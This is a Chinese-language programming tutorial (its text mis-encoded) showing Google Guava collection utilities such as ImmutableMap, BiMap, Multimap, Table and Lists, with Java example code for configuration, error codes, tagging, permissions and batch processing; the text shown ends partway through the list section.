<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae92d257680b431299aeb022e2a09ced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=i224q4JIQTjwZs166YHgkL6YC1Y%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-1">ä¸€ã€å¼•è¨€ï¼šä¸ºä»€ä¹ˆé€‰æ‹©Guavaï¼Ÿ</h3>
<p>åœ¨Javaå¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è¿™æ ·çš„ç—›ç‚¹ï¼š</p>
<ul>
<li><strong>åˆ›å»ºä¸å¯å˜é›†åˆ</strong>ï¼šJDKåŸç”ŸAPIè¿‡äºç¹ç</li>
<li><strong>å¤„ç†nullå€¼</strong>ï¼šéœ€è¦å¤§é‡çš„åˆ¤ç©ºä»£ç </li>
<li><strong>å­—ç¬¦ä¸²åˆ†å‰²</strong>ï¼š<code>String.split()</code>åŠŸèƒ½æœ‰é™ï¼Œæ— æ³•ä¼˜é›…å¤„ç†ç©ºç™½</li>
<li><strong>é›†åˆæ“ä½œ</strong>ï¼šç¼ºå°‘ä¾¿æ·çš„å·¥å…·æ–¹æ³•</li>
</ul>
<p>Google Guavaæ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œç”Ÿã€‚å®ƒæ˜¯Googleå¼€æºçš„Javaæ ¸å¿ƒåº“ï¼Œæä¾›äº†å¤§é‡ä¼˜é›…ã€é«˜æ•ˆçš„å·¥å…·ç±»ï¼Œè¢«Springã€Hibernateã€MyBatisç­‰ä¼—å¤šçŸ¥åæ¡†æ¶å¹¿æ³›ä½¿ç”¨ã€‚</p>
<p><strong>Guavaçš„æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<p>âœ… <strong>ä»£ç ç®€æ´</strong>ï¼šä¸€è¡Œä»£ç å®Œæˆå¤æ‚æ“ä½œ
âœ… <strong>ç©ºå€¼å®‰å…¨</strong>ï¼šå†…ç½®nullå¤„ç†æœºåˆ¶
âœ… <strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šç»è¿‡Googleç”Ÿäº§ç¯å¢ƒéªŒè¯
âœ… <strong>æ˜“äºä½¿ç”¨</strong>ï¼šæµç•…çš„APIè®¾è®¡ï¼Œé“¾å¼è°ƒç”¨</p>
<p>æœ¬æ–‡å°†æ·±å…¥ä»‹ç»Guavaä¸­æœ€å¸¸ç”¨çš„å››å¤§å·¥å…·ï¼š<strong>Mapã€Listã€Splitterã€Joiner</strong>ï¼Œé€šè¿‡çœŸå®æ¡ˆä¾‹å±•ç¤ºå®ƒä»¬åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„åº”ç”¨ã€‚</p>
<h3 data-id="heading-2">äºŒã€Guava Mapï¼šå¼ºå¤§çš„æ˜ å°„é›†åˆ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33b230e91b2a4fa893e18181ec215d6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=f%2FYfEJwV0G4DDTrHaF2FvfQPCEQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Guavaæä¾›äº†å¤šç§å¢å¼ºçš„Mapå®ç°ï¼Œæ¯ç§éƒ½é’ˆå¯¹ç‰¹å®šåœºæ™¯ä¼˜åŒ–ã€‚</p>
<h4 data-id="heading-3">2.1 ImmutableMapï¼šä¸å¯å˜æ˜ å°„</h4>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€åŒæ­¥</li>
<li>åˆ›å»ºåä¸å¯ä¿®æ”¹</li>
<li>æ€§èƒ½ä¼˜äºCollections.unmodifiableMap()</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.collect.ImmutableMap;

<span class="hljs-comment">// æ–¹å¼1ï¼šç›´æ¥æ„å»º</span>
ImmutableMap&lt;String, Integer&gt; map = ImmutableMap.of(
    <span class="hljs-string">"Java"</span>, <span class="hljs-number">1</span>,
    <span class="hljs-string">"Python"</span>, <span class="hljs-number">2</span>,
    <span class="hljs-string">"Go"</span>, <span class="hljs-number">3</span>
);

<span class="hljs-comment">// æ–¹å¼2ï¼šBuilderæ¨¡å¼ï¼ˆè¶…è¿‡5ä¸ªé”®å€¼å¯¹æ—¶ä½¿ç”¨ï¼‰</span>
ImmutableMap&lt;String, String&gt; configMap = ImmutableMap.&lt;String, String&gt;builder()
    .put(<span class="hljs-string">"db.host"</span>, <span class="hljs-string">"localhost"</span>)
    .put(<span class="hljs-string">"db.port"</span>, <span class="hljs-string">"3306"</span>)
    .put(<span class="hljs-string">"db.name"</span>, <span class="hljs-string">"test"</span>)
    .put(<span class="hljs-string">"db.user"</span>, <span class="hljs-string">"root"</span>)
    .put(<span class="hljs-string">"db.password"</span>, <span class="hljs-string">"123456"</span>)
    .build();

<span class="hljs-comment">// æ–¹å¼3ï¼šä»å·²æœ‰Mapå¤åˆ¶</span>
Map&lt;String, Integer&gt; originalMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
originalMap.put(<span class="hljs-string">"A"</span>, <span class="hljs-number">1</span>);
originalMap.put(<span class="hljs-string">"B"</span>, <span class="hljs-number">2</span>);
ImmutableMap&lt;String, Integer&gt; immutableCopy = ImmutableMap.copyOf(originalMap);
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šé…ç½®ç®¡ç†</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConfig</span> {

    <span class="hljs-comment">// ç¯å¢ƒé…ç½®æ˜ å°„ï¼Œä¸å¯å˜ä¸”çº¿ç¨‹å®‰å…¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ImmutableMap&lt;String, String&gt; ENV_CONFIG = ImmutableMap.of(
        <span class="hljs-string">"dev"</span>, <span class="hljs-string">"jdbc:mysql://dev-db:3306/app"</span>,
        <span class="hljs-string">"test"</span>, <span class="hljs-string">"jdbc:mysql://test-db:3306/app"</span>,
        <span class="hljs-string">"prod"</span>, <span class="hljs-string">"jdbc:mysql://prod-db:3306/app"</span>
    );

    <span class="hljs-comment">// HTTPçŠ¶æ€ç æ˜ å°„</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ImmutableMap&lt;Integer, String&gt; HTTP_STATUS =
        ImmutableMap.&lt;Integer, String&gt;builder()
            .put(<span class="hljs-number">200</span>, <span class="hljs-string">"OK"</span>)
            .put(<span class="hljs-number">201</span>, <span class="hljs-string">"Created"</span>)
            .put(<span class="hljs-number">400</span>, <span class="hljs-string">"Bad Request"</span>)
            .put(<span class="hljs-number">401</span>, <span class="hljs-string">"Unauthorized"</span>)
            .put(<span class="hljs-number">403</span>, <span class="hljs-string">"Forbidden"</span>)
            .put(<span class="hljs-number">404</span>, <span class="hljs-string">"Not Found"</span>)
            .put(<span class="hljs-number">500</span>, <span class="hljs-string">"Internal Server Error"</span>)
            .build();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDbUrl</span><span class="hljs-params">(String env)</span> {
        <span class="hljs-keyword">return</span> ENV_CONFIG.getOrDefault(env, ENV_CONFIG.get(<span class="hljs-string">"dev"</span>));
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getStatusMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> {
        <span class="hljs-keyword">return</span> HTTP_STATUS.getOrDefault(code, <span class="hljs-string">"Unknown Status"</span>);
    }
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…äº†åŒæ­¥å¼€é”€</li>
<li>å†…å­˜å ç”¨æ›´å°‘ï¼ˆä¼˜åŒ–çš„å†…éƒ¨ç»“æ„ï¼‰</li>
<li>ç¼–è¯‘æœŸå°±èƒ½å‘ç°ä¿®æ”¹é”™è¯¯</li>
</ul>
<h4 data-id="heading-4">2.2 BiMapï¼šåŒå‘æ˜ å°„</h4>
<p>BiMapå…è®¸ä½ æ ¹æ®å€¼åå‘æŸ¥æ‰¾é”®ï¼Œéå¸¸é€‚åˆåŒå‘æ˜ å°„åœºæ™¯ã€‚</p>
<p><strong>åŸºæœ¬ç”¨æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.collect.BiMap;
<span class="hljs-keyword">import</span> com.google.common.collect.HashBiMap;

<span class="hljs-comment">// åˆ›å»ºBiMap</span>
BiMap&lt;String, Integer&gt; userIdMap = HashBiMap.create();
userIdMap.put(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">1001</span>);
userIdMap.put(<span class="hljs-string">"Bob"</span>, <span class="hljs-number">1002</span>);
userIdMap.put(<span class="hljs-string">"Charlie"</span>, <span class="hljs-number">1003</span>);

<span class="hljs-comment">// æ­£å‘æŸ¥æ‰¾</span>
<span class="hljs-type">Integer</span> <span class="hljs-variable">aliceId</span> <span class="hljs-operator">=</span> userIdMap.get(<span class="hljs-string">"Alice"</span>);  <span class="hljs-comment">// 1001</span>

<span class="hljs-comment">// åå‘æŸ¥æ‰¾</span>
BiMap&lt;Integer, String&gt; inverse = userIdMap.inverse();
<span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> inverse.get(<span class="hljs-number">1002</span>);  <span class="hljs-comment">// "Bob"</span>

<span class="hljs-comment">// æ³¨æ„ï¼šå€¼å¿…é¡»å”¯ä¸€ï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸</span>
userIdMap.put(<span class="hljs-string">"David"</span>, <span class="hljs-number">1001</span>);  <span class="hljs-comment">// æŠ›å‡ºIllegalArgumentException</span>

<span class="hljs-comment">// å¼ºåˆ¶æ›¿æ¢</span>
userIdMap.forcePut(<span class="hljs-string">"David"</span>, <span class="hljs-number">1001</span>);  <span class="hljs-comment">// Aliceè¢«ç§»é™¤ï¼ŒDavidæ˜ å°„åˆ°1001</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šé”™è¯¯ç ç®¡ç†</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorCodeManager</span> {

    <span class="hljs-comment">// é”™è¯¯ç ä¸æ¶ˆæ¯çš„åŒå‘æ˜ å°„</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> BiMap&lt;String, Integer&gt; ERROR_CODES = HashBiMap.create();

    <span class="hljs-keyword">static</span> {
        ERROR_CODES.put(<span class="hljs-string">"USER_NOT_FOUND"</span>, <span class="hljs-number">1001</span>);
        ERROR_CODES.put(<span class="hljs-string">"INVALID_PASSWORD"</span>, <span class="hljs-number">1002</span>);
        ERROR_CODES.put(<span class="hljs-string">"ACCOUNT_LOCKED"</span>, <span class="hljs-number">1003</span>);
        ERROR_CODES.put(<span class="hljs-string">"PERMISSION_DENIED"</span>, <span class="hljs-number">1004</span>);
    }

    <span class="hljs-comment">// æ ¹æ®é”™è¯¯åè·å–é”™è¯¯ç </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer <span class="hljs-title function_">getErrorCode</span><span class="hljs-params">(String errorName)</span> {
        <span class="hljs-keyword">return</span> ERROR_CODES.get(errorName);
    }

    <span class="hljs-comment">// æ ¹æ®é”™è¯¯ç è·å–é”™è¯¯å</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getErrorName</span><span class="hljs-params">(Integer errorCode)</span> {
        <span class="hljs-keyword">return</span> ERROR_CODES.inverse().get(errorCode);
    }

    <span class="hljs-comment">// ç¤ºä¾‹ï¼šæ—¥å¿—è®°å½•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logError</span><span class="hljs-params">(Integer errorCode)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">errorName</span> <span class="hljs-operator">=</span> getErrorName(errorCode);
        System.out.println(<span class="hljs-string">"Error ["</span> + errorCode + <span class="hljs-string">"]: "</span> + errorName);
    }
}
</code></pre>
<h4 data-id="heading-5">2.3 Multimapï¼šä¸€é”®å¤šå€¼æ˜ å°„</h4>
<p>Multimapå…è®¸ä¸€ä¸ªé”®å¯¹åº”å¤šä¸ªå€¼ï¼Œé¿å…äº†<code>Map&lt;K, List&lt;V&gt;&gt;</code>çš„ç¹çæ“ä½œã€‚</p>
<p><strong>åŸºæœ¬ç”¨æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.collect.ArrayListMultimap;
<span class="hljs-keyword">import</span> com.google.common.collect.Multimap;

<span class="hljs-comment">// åˆ›å»ºMultimap</span>
Multimap&lt;String, String&gt; tagMap = ArrayListMultimap.create();

<span class="hljs-comment">// æ·»åŠ å¤šä¸ªå€¼</span>
tagMap.put(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"Spring"</span>);
tagMap.put(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"MyBatis"</span>);
tagMap.put(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"Guava"</span>);
tagMap.put(<span class="hljs-string">"Python"</span>, <span class="hljs-string">"Django"</span>);
tagMap.put(<span class="hljs-string">"Python"</span>, <span class="hljs-string">"Flask"</span>);

<span class="hljs-comment">// è·å–æŸä¸ªé”®çš„æ‰€æœ‰å€¼</span>
Collection&lt;String&gt; javaTags = tagMap.get(<span class="hljs-string">"Java"</span>);
<span class="hljs-comment">// ["Spring", "MyBatis", "Guava"]</span>

<span class="hljs-comment">// è·å–æ‰€æœ‰é”®å€¼å¯¹</span>
<span class="hljs-keyword">for</span> (Map.Entry&lt;String, String&gt; entry : tagMap.entries()) {
    System.out.println(entry.getKey() + <span class="hljs-string">" -&gt; "</span> + entry.getValue());
}

<span class="hljs-comment">// ç§»é™¤ç‰¹å®šå€¼</span>
tagMap.remove(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"MyBatis"</span>);
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šæ–‡ç« æ ‡ç­¾ç³»ç»Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArticleTagService</span> {

    <span class="hljs-comment">// æ–‡ç« ID -&gt; æ ‡ç­¾åˆ—è¡¨çš„æ˜ å°„</span>
    <span class="hljs-keyword">private</span> Multimap&lt;Long, String&gt; articleTags = ArrayListMultimap.create();

    <span class="hljs-comment">// æ·»åŠ æ ‡ç­¾</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTag</span><span class="hljs-params">(Long articleId, String tag)</span> {
        articleTags.put(articleId, tag);
    }

    <span class="hljs-comment">// æ‰¹é‡æ·»åŠ æ ‡ç­¾</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTags</span><span class="hljs-params">(Long articleId, List&lt;String&gt; tags)</span> {
        articleTags.putAll(articleId, tags);
    }

    <span class="hljs-comment">// è·å–æ–‡ç« çš„æ‰€æœ‰æ ‡ç­¾</span>
    <span class="hljs-keyword">public</span> Collection&lt;String&gt; <span class="hljs-title function_">getTags</span><span class="hljs-params">(Long articleId)</span> {
        <span class="hljs-keyword">return</span> articleTags.get(articleId);
    }

    <span class="hljs-comment">// ç§»é™¤æ ‡ç­¾</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeTag</span><span class="hljs-params">(Long articleId, String tag)</span> {
        articleTags.remove(articleId, tag);
    }

    <span class="hljs-comment">// æŸ¥æ‰¾åŒ…å«æŸæ ‡ç­¾çš„æ‰€æœ‰æ–‡ç« </span>
    <span class="hljs-keyword">public</span> List&lt;Long&gt; <span class="hljs-title function_">findArticlesByTag</span><span class="hljs-params">(String tag)</span> {
        <span class="hljs-keyword">return</span> articleTags.entries().stream()
            .filter(entry -&gt; entry.getValue().equals(tag))
            .map(Map.Entry::getKey)
            .collect(Collectors.toList());
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-type">ArticleTagService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArticleTagService</span>();
service.addTags(<span class="hljs-number">1001L</span>, Arrays.asList(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"Spring"</span>, <span class="hljs-string">"åç«¯"</span>));
service.addTags(<span class="hljs-number">1002L</span>, Arrays.asList(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"MyBatis"</span>, <span class="hljs-string">"æ•°æ®åº“"</span>));

Collection&lt;String&gt; tags = service.getTags(<span class="hljs-number">1001L</span>);
<span class="hljs-comment">// ["Java", "Spring", "åç«¯"]</span>

List&lt;Long&gt; javaArticles = service.findArticlesByTag(<span class="hljs-string">"Java"</span>);
<span class="hljs-comment">// [1001, 1002]</span>
</code></pre>
<h4 data-id="heading-6">2.4 Tableï¼šåŒé”®æ˜ å°„è¡¨</h4>
<p>Tableæä¾›äº†ç±»ä¼¼æ•°æ®åº“è¡¨çš„ç»“æ„ï¼Œæ”¯æŒè¡Œé”®å’Œåˆ—é”®ã€‚</p>
<p><strong>åŸºæœ¬ç”¨æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.collect.HashBasedTable;
<span class="hljs-keyword">import</span> com.google.common.collect.Table;

<span class="hljs-comment">// åˆ›å»ºTable</span>
Table&lt;String, String, Integer&gt; scoreTable = HashBasedTable.create();

<span class="hljs-comment">// æ·»åŠ æ•°æ®ï¼ˆå­¦ç”Ÿã€ç§‘ç›®ã€åˆ†æ•°ï¼‰</span>
scoreTable.put(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Math"</span>, <span class="hljs-number">95</span>);
scoreTable.put(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"English"</span>, <span class="hljs-number">88</span>);
scoreTable.put(<span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Math"</span>, <span class="hljs-number">82</span>);
scoreTable.put(<span class="hljs-string">"Bob"</span>, <span class="hljs-string">"English"</span>, <span class="hljs-number">90</span>);

<span class="hljs-comment">// è·å–ç‰¹å®šå•å…ƒæ ¼çš„å€¼</span>
<span class="hljs-type">Integer</span> <span class="hljs-variable">aliceMath</span> <span class="hljs-operator">=</span> scoreTable.get(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Math"</span>);  <span class="hljs-comment">// 95</span>

<span class="hljs-comment">// è·å–æŸä¸€è¡Œ</span>
Map&lt;String, Integer&gt; aliceScores = scoreTable.row(<span class="hljs-string">"Alice"</span>);
<span class="hljs-comment">// {Math=95, English=88}</span>

<span class="hljs-comment">// è·å–æŸä¸€åˆ—</span>
Map&lt;String, Integer&gt; mathScores = scoreTable.column(<span class="hljs-string">"Math"</span>);
<span class="hljs-comment">// {Alice=95, Bob=82}</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šæƒé™çŸ©é˜µ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionMatrix</span> {

    <span class="hljs-comment">// ç”¨æˆ·è§’è‰²ã€èµ„æºã€æƒé™çš„æ˜ å°„è¡¨</span>
    <span class="hljs-keyword">private</span> Table&lt;String, String, Set&lt;String&gt;&gt; permissionTable = HashBasedTable.create();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PermissionMatrix</span><span class="hljs-params">()</span> {
        initPermissions();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initPermissions</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç®¡ç†å‘˜æƒé™</span>
        permissionTable.put(<span class="hljs-string">"ADMIN"</span>, <span class="hljs-string">"USER"</span>, Sets.newHashSet(<span class="hljs-string">"CREATE"</span>, <span class="hljs-string">"READ"</span>, <span class="hljs-string">"UPDATE"</span>, <span class="hljs-string">"DELETE"</span>));
        permissionTable.put(<span class="hljs-string">"ADMIN"</span>, <span class="hljs-string">"ORDER"</span>, Sets.newHashSet(<span class="hljs-string">"CREATE"</span>, <span class="hljs-string">"READ"</span>, <span class="hljs-string">"UPDATE"</span>, <span class="hljs-string">"DELETE"</span>));

        <span class="hljs-comment">// æ™®é€šç”¨æˆ·æƒé™</span>
        permissionTable.put(<span class="hljs-string">"USER"</span>, <span class="hljs-string">"USER"</span>, Sets.newHashSet(<span class="hljs-string">"READ"</span>, <span class="hljs-string">"UPDATE"</span>));
        permissionTable.put(<span class="hljs-string">"USER"</span>, <span class="hljs-string">"ORDER"</span>, Sets.newHashSet(<span class="hljs-string">"CREATE"</span>, <span class="hljs-string">"READ"</span>));

        <span class="hljs-comment">// è®¿å®¢æƒé™</span>
        permissionTable.put(<span class="hljs-string">"GUEST"</span>, <span class="hljs-string">"USER"</span>, Sets.newHashSet(<span class="hljs-string">"READ"</span>));
        permissionTable.put(<span class="hljs-string">"GUEST"</span>, <span class="hljs-string">"ORDER"</span>, Sets.newHashSet(<span class="hljs-string">"READ"</span>));
    }

    <span class="hljs-comment">// æ£€æŸ¥æƒé™</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasPermission</span><span class="hljs-params">(String role, String resource, String action)</span> {
        Set&lt;String&gt; permissions = permissionTable.get(role, resource);
        <span class="hljs-keyword">return</span> permissions != <span class="hljs-literal">null</span> &amp;&amp; permissions.contains(action);
    }

    <span class="hljs-comment">// è·å–è§’è‰²åœ¨æŸèµ„æºä¸Šçš„æ‰€æœ‰æƒé™</span>
    <span class="hljs-keyword">public</span> Set&lt;String&gt; <span class="hljs-title function_">getPermissions</span><span class="hljs-params">(String role, String resource)</span> {
        <span class="hljs-keyword">return</span> permissionTable.get(role, resource);
    }
}
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€Guava Listï¼šå¼ºå¤§çš„åˆ—è¡¨å·¥å…·</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3927c675242f4108a99abfc78f374e4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=bsCn%2B%2FSZjwnN9CjPza%2FYbP268jE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-8">3.1 ImmutableListï¼šä¸å¯å˜åˆ—è¡¨</h4>
<p><strong>åŸºæœ¬ç”¨æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.collect.ImmutableList;

<span class="hljs-comment">// æ–¹å¼1ï¼šç›´æ¥æ„å»º</span>
ImmutableList&lt;String&gt; languages = ImmutableList.of(<span class="hljs-string">"Java"</span>, <span class="hljs-string">"Python"</span>, <span class="hljs-string">"Go"</span>);

<span class="hljs-comment">// æ–¹å¼2ï¼šBuilderæ¨¡å¼</span>
ImmutableList&lt;Integer&gt; numbers = ImmutableList.&lt;Integer&gt;builder()
    .add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
    .add(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
    .build();

<span class="hljs-comment">// æ–¹å¼3ï¼šä»å·²æœ‰é›†åˆå¤åˆ¶</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>));
ImmutableList&lt;String&gt; immutableCopy = ImmutableList.copyOf(list);
</code></pre>
<h4 data-id="heading-9">3.2 Listså·¥å…·ç±»</h4>
<p><strong>åˆ›å»ºåˆ—è¡¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.collect.Lists;

<span class="hljs-comment">// åˆ›å»ºArrayListå¹¶åˆå§‹åŒ–</span>
List&lt;String&gt; list = Lists.newArrayList(<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>);

<span class="hljs-comment">// åˆ›å»ºæŒ‡å®šå®¹é‡çš„ArrayList</span>
List&lt;String&gt; listWithCapacity = Lists.newArrayListWithCapacity(<span class="hljs-number">100</span>);

<span class="hljs-comment">// åˆ›å»ºLinkedList</span>
List&lt;Integer&gt; linkedList = Lists.newLinkedList();
</code></pre>
<p><strong>åˆ—è¡¨åˆ†å‰²ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å°†å¤§åˆ—è¡¨åˆ†å‰²ä¸ºå›ºå®šå¤§å°çš„å­åˆ—è¡¨</span>
List&lt;Integer&gt; bigList = Lists.newArrayList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);
List&lt;List&lt;Integer&gt;&gt; partitions = Lists.partition(bigList, <span class="hljs-number">3</span>);

<span class="hljs-comment">// ç»“æœï¼š[[1, 2, 3], [4, 5, 6], [7, 8, 9], [10]]</span>
<span class="hljs-keyword">for</span> (List&lt;Integer&gt; partition : partitions) {
    System.out.println(partition);
}
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šæ‰¹é‡å¤„ç†</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BatchProcessor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BATCH_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

    <span class="hljs-comment">// æ‰¹é‡æ’å…¥æ•°æ®</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchInsert</span><span class="hljs-params">(List&lt;User&gt; users)</span> {
        <span class="hljs-comment">// å°†ç”¨æˆ·åˆ—è¡¨åˆ†å‰²ä¸ºæ¯100ä¸ªä¸€æ‰¹</span>
        List&lt;List&lt;User&gt;&gt; batches = Lists.partition(users, BATCH_SIZE);

        <span class="hljs-keyword">for</span> (List&lt;User&gt; batch : batches) {
            <span class="hljs-comment">// æ‰¹é‡æ’å…¥åˆ°æ•°æ®åº“</span>
            userDao.batchInsert(batch);

            <span class="hljs-comment">// é¿å…è¿‡å¿«çš„æ’å…¥å¯¼è‡´æ•°æ®åº“å‹åŠ›</span>
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">100</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }

    <span class="hljs-comment">// æ‰¹é‡å‘é€é€šçŸ¥</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchNotify</span><span class="hljs-params">(List&lt;Long&gt; userIds, String message)</span> {
        Lists.partition(userIds, <span class="hljs-number">50</span>).forEach(batch -&gt; {
            <span class="hljs-comment">// æ¯æ‰¹æœ€å¤š50ä¸ªç”¨æˆ·</span>
            notificationService.sendBatch(batch, message);
        });
    }
}
</code></pre>
<p><strong>åˆ—è¡¨åè½¬ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; list = Lists.newArrayList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>);
List&lt;String&gt; reversed = Lists.reverse(list);
<span class="hljs-comment">// ["D", "C", "B", "A"]</span>
</code></pre>
<p><strong>åˆ—è¡¨è½¬æ¢ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; names = Lists.newArrayList(<span class="hljs-string">"alice"</span>, <span class="hljs-string">"bob"</span>, <span class="hljs-string">"charlie"</span>);

<span class="hljs-comment">// è½¬æ¢ä¸ºå¤§å†™</span>
List&lt;String&gt; upperNames = Lists.transform(names, String::toUpperCase);
<span class="hljs-comment">// ["ALICE", "BOB", "CHARLIE"]</span>

<span class="hljs-comment">// æ³¨æ„ï¼štransformè¿”å›çš„æ˜¯è§†å›¾ï¼Œä¸æ˜¯æ–°åˆ—è¡¨</span>
</code></pre>
